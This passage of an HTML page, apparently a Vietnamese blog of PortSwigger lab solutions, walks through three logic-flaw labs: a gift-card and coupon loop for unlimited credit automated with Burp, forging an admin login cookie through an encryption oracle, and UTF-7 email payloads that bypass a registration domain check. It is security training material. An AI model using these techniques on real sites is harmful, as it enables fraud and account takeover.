+<span class="nb">Set</span><span class="o">-</span><span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">V92jNF16mr3duWhXLha1p79ogVHpqC6Q</span><span class="p">;</span><span class="w"> </span><span class="nx">Secure</span><span class="p">;</span><span class="w"> </span><span class="nx">HttpOnly</span><span class="p">;</span><span class="w"> </span><span class="nx">SameSite</span><span class="o">=</span><span class="nx">None</span>
+<span class="nx">X</span><span class="o">-</span><span class="nx">Frame</span><span class="o">-</span><span class="nx">Options</span><span class="o">:</span><span class="w"> </span><span class="nx">SAMEORIGIN</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+</ul>
+<p><img alt="image.png" src="image%2036.png" /></p>
+<ul>
+<li>
+<p>Quan sát thấy truy cập vào admin panel thành công. Thực hiện xóa user <code>carlos</code> . Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2037.png" /></p>
+</li>
+</ul>
+<h1 id="lab-infinite-money-logic-flaw"><strong>Lab: Infinite money logic flaw</strong><a class="headerlink" href="#lab-infinite-money-logic-flaw" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money">Lab: Infinite money logic flaw | Web Security Academy</a></p>
+<ul>
+<li>Thực hiện login vào account <code>wiener:peter</code></li>
+<li>
+<p>Quan sát thấy khi thực hiện chức năng <code>Sign up to our newsletter!</code>thì nhận được coupon dùng nhiều lần</p>
+<p><img alt="image.png" src="image%2038.png" /></p>
+<p><img alt="image.png" src="image%2039.png" /></p>
+</li>
+<li>
+<p>Khi thực hiện mua sản phẩm <code>Gift card</code> , nhận thấy có thể hoàn trả và nhận lại đúng số tiền 10.00$</p>
+<p><img alt="image.png" src="image%2040.png" /></p>
+</li>
+<li>
+<p>Như vậy, nếu như chúng ta mua sản phẩm trên với voucher sau đó redeem thì mỗi lần có thể nhận thêm tiền.</p>
+</li>
+<li>
+<p>Để dễ dàng hơn cho việc lấy tiền, chúng ta có thể dùng Burp macro và set up như sau</p>
+<ul>
+<li>
+<p>Macro</p>
+<ul>
+<li>
+<p>Thực hiện tạo Macro với 4 request sau</p>
+<p><img alt="image.png" src="image%2041.png" /></p>
+</li>
+<li>
+<p>Thực hiện config request cuối để lấy <code>code</code> từ response như sau</p>
+<p><img alt="image.png" src="image%2042.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gửi request sau trong Burp intruder</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">gift</span><span class="o">-</span><span class="nx">card</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">acb0048040adbe1816c3e7700f8003b</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">wD9sobgo7jmxknw47GnDyvixG6ofNLMw</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">58</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0acb0048040adbe1816c3e7700f8003b.web-security-academy.net</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0acb0048040adbe1816c3e7700f8003b.web-security-academy.net/my-account?id=wiener</span>
+<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">navigate</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">User</span><span class="o">:</span><span class="w"> </span><span class="o">?</span><span class="mf">1</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="nx">csrf</span><span class="o">=</span><span class="nx">Bn10ueouMek1U06FiQJLOLJGk5QdxFTd</span><span class="o">&amp;</span><span class="nx">gift</span><span class="o">-</span><span class="nx">card</span><span class="o">=</span><span class="nx">Pcr7pwVreI</span>
+</code></pre></div>
+</li>
+<li>
+<p>Config với null payload</p>
+<p><img alt="image.png" src="image%2043.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Quan sát thấy chúng ta có thể có được số tiền lớn hơn ban đầu mà không cần nạp</p>
+<p><img alt="image.png" src="image%2044.png" /></p>
+</li>
+<li>
+<p>Thực hiện mua hàng thành công. Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2045.png" /></p>
+</li>
+</ul>
+<h1 id="lab-authentication-bypass-via-encryption-oracle"><strong>Lab: Authentication bypass via encryption oracle</strong><a class="headerlink" href="#lab-authentication-bypass-via-encryption-oracle" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle">Lab: Authentication bypass via encryption oracle | Web Security Academy</a></p>
+<ul>
+<li>Thực hiện login vào account <code>wiener:peter</code></li>
+<li>
+<p>Điều hướng đến chức năng <code>My account &gt; Update email</code></p>
+<p><img alt="image.png" src="image%2046.png" /></p>
+</li>
+<li>
+<p>Thực hiện update email không hợp lệ. Trong phần mềm Burpsuite, chúng ta quan sát thấy có thêm param <code>notification</code> trả về đồng thời giao diện hiển thị thêm một thông báo lỗi ⇒ có thể phía server đã decrypt param này và render lên giao diện</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2047.png" /></p>
+<p><img alt="image.png" src="image%2048.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Tiếp theo, khi chúng ta thực hiện chọn chức năng <code>Stay log in</code> , chúng ta thấy rằng trong cookie có thêm một param <code>stay-logged-in</code> cho phép ghi nhớ người dùng cũng có dạng mã hóa giống notification → có thể tạo ra token người khác</p>
+</li>
+<li>
+<p>Thực hiện chỉnh sửa request gửi tới API <code>POST /my-account/change-email</code>  bằng cách đăng ký email với 9 bytes junk ở trước nhờ đó để ghép với chuỗi <code>Invalid email address:</code> tạo đủ 32 bytes, nhờ vậy có thể cắt được 32 bytes còn lại làm token</p>
+<ul>
+<li>
+<p>Số byte chuỗi ban đầu</p>
+<p><img alt="image.png" src="image%2049.png" /></p>
+</li>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">my</span><span class="o">-</span><span class="nx">account</span><span class="o">/</span><span class="nx">change</span><span class="o">-</span><span class="nx">email</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">afc00f4037e75ff8233c9a00088000c</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">notification</span><span class="o">=%</span><span class="mf">2</span><span class="nx">bktCG</span><span class="o">%</span><span class="mf">2</span><span class="nx">fKnvc5Uy0h</span><span class="o">%</span><span class="mf">2</span><span class="nx">fcaT7s8oSMLhMozm13lZJAHhLIfA</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="p">;</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">N3zxiv1ewzekx31pfcl5UNMENDcjSfaK</span><span class="p">;</span><span class="w"> </span><span class="nx">stay</span><span class="o">-</span><span class="nx">logged</span><span class="o">-</span><span class="ow">in</span><span class="o">=</span><span class="nx">S2OQeIMbFIRKKs9z0k0s6SdibG0ihPmjSMmSEMESkQM</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">78</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0afc00f4037e75ff8233c9a00088000c.web-security-academy.net</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0afc00f4037e75ff8233c9a00088000c.web-security-academy.net/my-account</span>
+<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">navigate</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">User</span><span class="o">:</span><span class="w"> </span><span class="o">?</span><span class="mf">1</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="nx">email</span><span class="o">=</span><span class="mf">111111111</span><span class="nx">administrator</span><span class="o">%</span><span class="mf">3</span><span class="nx">a100000000</span><span class="o">&amp;</span><span class="nx">csrf</span><span class="o">=</span><span class="nx">xNZQLe9PqCpv6yD4EaJnGYsTbeBuU6XL</span>
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%2050.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện đưa chuỗi lấy được từ response trên, chuyển sang tab decoder và thực hiện cắt byte như sau:</p>
+<ul>
+<li>
+<p>Thực hiện URL decode, base64 decode chuyển sang hex view và chọn cắt 32 bytes đầu tiên. Tiếp tục base64 encode</p>
+<p><img alt="image.png" src="image%2051.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gửi token vừa tạo. Quan sát thấy vào tài khoản admin thành công</p>
+<p><img alt="image.png" src="image%2052.png" /></p>
+</li>
+<li>
+<p>Thực hiện vào <code>Admin panel</code> và xóa user <code>carlos</code> . Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2053.png" /></p>
+</li>
+</ul>
+<h1 id="lab-bypassing-access-controls-using-email-address-parsing-discrepancies"><strong>Lab: Bypassing access controls using email address parsing discrepancies</strong><a class="headerlink" href="#lab-bypassing-access-controls-using-email-address-parsing-discrepancies" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-bypassing-access-controls-using-email-address-parsing-discrepancies">Lab: Bypassing access controls using email address parsing discrepancies | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện điều hướng đến chức năng <code>Register</code></p>
+<p><img alt="image.png" src="image%2054.png" /></p>
+</li>
+<li>
+<p>Ở đây, chỉ có thể sử dụng email với domain là <code>ginandjuice.shop</code></p>
+<p><img alt="image.png" src="image%2055.png" /></p>
+<p><img alt="image.png" src="image%2056.png" /></p>
+</li>
+<li>
+<p>Tiếp theo đó là fuzzing, nhận thấy với cách encode <code>utf-8</code> và <code>iso-8859-1</code> bị chặn nhưng <code>utf-7</code> thì không bị</p>
+<ul>
+<li>
+<p>Payload</p>
+<ul>
+<li>
+<p>utf-8</p>
+<div class="highlight"><pre><span></span><code><span class="o">=?</span><span class="nx">utf</span><span class="o">-</span><span class="mf">8</span><span class="o">?</span><span class="nx">q</span><span class="o">?=</span><span class="mf">61</span><span class="o">=</span><span class="mf">62</span><span class="o">=</span><span class="mf">63</span><span class="o">?=</span><span class="err">@</span><span class="nx">ginandjuice</span><span class="p">.</span><span class="nx">shop</span>
+</code></pre></div>
+</li>
+<li>
+<p>utf-7</p>
+<div class="highlight"><pre><span></span><code><span class="o">=?</span><span class="nx">utf</span><span class="o">-</span><span class="mf">7</span><span class="o">?</span><span class="nx">q</span><span class="o">?%</span><span class="mf">26</span><span class="nx">AGEAYgBj</span><span class="o">-?=</span><span class="err">@</span><span class="nx">ginandjuice</span><span class="p">.</span><span class="nx">shop</span>
+</code></pre></div>
+</li>
+<li>
+<p>Dùng <code>x</code></p>
+<div class="highlight"><pre><span></span><code><span class="o">=?</span><span class="nx">x</span><span class="o">?</span><span class="nx">q</span><span class="o">?=</span><span class="mf">61</span><span class="o">=</span><span class="mf">62</span><span class="o">=</span><span class="mf">63</span><span class="o">?=</span><span class="err">@</span><span class="nx">ginandjuice</span><span class="p">.</span><span class="nx">shop</span>
+<span class="o">=?</span><span class="nx">x</span><span class="o">?</span><span class="nx">q</span><span class="o">?%</span><span class="mf">26</span><span class="nx">AGEAYgBj</span><span class="o">-?=</span><span class="err">@</span><span class="nx">ginandjuice</span><span class="p">.</span><span class="nx">shop</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2057.png" /></p>
+<p><img alt="image.png" src="image%2058.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Sau đó, mình thực hiện encode ký tự <code>@</code> và  `` với email của attacker thì được token gửi về</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="o">=?</span><span class="nx">utf</span><span class="o">-</span><span class="mf">7</span><span class="o">?</span><span class="nx">q</span><span class="o">?</span><span class="nx">attacker1</span><span class="o">%</span><span class="mf">26</span><span class="nx">AEA</span><span class="o">-</span><span class="nx">exploit</span><span class="o">-</span><span class="mf">0</span><span class="nx">a9100fa04d0775580b92afd01d800a4</span><span class="p">.</span><span class="nx">exploit</span><span class="o">-</span><span class="nx">server</span><span class="p">.</span><span class="nx">net</span><span class="o">%</span><span class="mf">26</span><span class="nx">ACA</span><span class="o">-?=</span><span class="err">@</span><span class="nx">ginandjuice</span><span class="p">.</span><span class="nx">shop</span>
+</code></pre></div>
+</li>
+<li>
+<p>Kết quả</p>
+<p><img alt="image.png" src="image%2059.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện truy cập email, lấy token và login thành công xóa user Carlos. Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2060.png" /></p>
+<p><img alt="image.png" src="image%2061.png" /></p>
+</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.sections", "navigation.top", "search.highlight", "search.suggest", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
